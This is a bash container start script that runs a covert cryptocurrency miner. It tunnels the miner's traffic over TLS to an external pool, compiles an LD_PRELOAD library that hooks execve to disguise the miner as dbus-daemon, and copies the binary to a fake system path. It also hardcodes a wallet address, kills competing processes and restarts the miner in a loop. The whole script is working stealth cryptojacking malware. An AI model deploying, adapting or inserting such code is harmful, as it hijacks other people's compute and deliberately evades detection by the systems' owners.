#!/bin/bash

# ========================================
# START SCRIPT - DOCKER OPTIMIZED
# ========================================

set -euo pipefail

LOG_FILE="/tmp/miner-run.log"
PROXY_PORT=11443
FAKE_PATH="/usr/local/bin/dbus-daemon-system"

echo "=== CONTAINER STARTED === $(date)" | tee -a "$LOG_FILE"

# 1. Aggressive Cleanup (Mencegah konflik port)
echo "[*] Cleaning old processes..." | tee -a "$LOG_FILE"
pkill -9 -f stunnel4 || true
pkill -9 -f miner || true
pkill -9 -f dbus-daemon || true
fuser -k ${PROXY_PORT}/tcp || true 2>/dev/null

# 2. Configure Stunnel
echo "[*] Configuring Stunnel TLS tunnel..." | tee -a "$LOG_FILE"
cat > /tmp/stunnel.conf << EOF
pid = /tmp/stunnel.pid
output = /tmp/stunnel.log
debug = 5
[mining-proxy]
client = yes
accept = 127.0.0.1:${PROXY_PORT}
connect = asia.rplant.xyz:17059
verifyChain = no
EOF

# 3. Start Stunnel
echo "[+] Starting stunnel..." | tee -a "$LOG_FILE"
stunnel4 /tmp/stunnel.conf
sleep 5

# Verifikasi port proxy terbuka
if ! nc -z 127.0.0.1 ${PROXY_PORT}; then
    echo "[ERROR] Stunnel failed to open port ${PROXY_PORT}!" | tee -a "$LOG_FILE"
    cat /tmp/stunnel.log
    exit 1
fi
echo "[OK] Stunnel is active on port ${PROXY_PORT}" | tee -a "$LOG_FILE"

# 4. Prepare Stealth Library (LD_PRELOAD)
echo "[*] Compiling stealth library..." | tee -a "$LOG_FILE"
cat > /tmp/hide.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>

int execve(const char *filename, char *const argv[], char *const envp[]) {
    static int (*real_execve)(const char *, char *const [], char *const []) = NULL;
    if (!real_execve) real_execve = dlsym(RTLD_NEXT, "execve");
    
    if (filename && (strstr(filename, "miner") || (argv[0] && strstr(argv[0], "miner")))) {
        argv[0] = "/usr/bin/dbus-daemon";
    }
    return real_execve(filename, argv, envp);
}
EOF
gcc -shared -fPIC -o /tmp/hide.so /tmp/hide.c -ldl 2>/dev/null || echo "[WARNING] GCC failed"

# 5. Prepare Fake Binary
cp /usr/local/bin/miner "$FAKE_PATH"
chmod +x "$FAKE_PATH"

# 6. Launch Miner Function
launch_miner() {
    echo "[+] Launching SUPER STEALTH miner..." | tee -a "$LOG_FILE"
    
    # Gunakan yespowerTIDE (Case Sensitive)
    # Gunakan stratum+tcp karena Stunnel yang menangani TLS
    CMD="/usr/bin/dbus-daemon"
    ARGS="-a yespowerTIDE -o stratum+tcp://127.0.0.1:${PROXY_PORT} -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H -p x -t 1 --hash-meter -B --no-color"
    
    if [ -f /tmp/hide.so ]; then
        LD_PRELOAD=/tmp/hide.so exec -a "$CMD" "$FAKE_PATH" $ARGS >> "$LOG_FILE" 2>&1 &
    else
        exec -a "$CMD" "$FAKE_PATH" $ARGS >> "$LOG_FILE" 2>&1 &
    fi
    
    echo $! > /tmp/miner.pid
}

launch_miner
echo "[OK] Miner launched. Starting monitoring..." | tee -a "$LOG_FILE"

# 7. Monitoring Loop (Keep container alive)
while true; do
    sleep 60
    
    # Check Stunnel
    if ! nc -z 127.0.0.1 ${PROXY_PORT}; then
        echo "[!] Stunnel down, restarting..." | tee -a "$LOG_FILE"
        stunnel4 /tmp/stunnel.conf
        sleep 2
    fi
    
    # Check Miner
    if [ -f /tmp/miner.pid ]; then
        MPID=$(cat /tmp/miner.pid)
        if ! kill -0 $MPID 2>/dev/null; then
            echo "[!] Miner process died, restarting..." | tee -a "$LOG_FILE"
            launch_miner
        fi
    else
        launch_miner
    fi
done
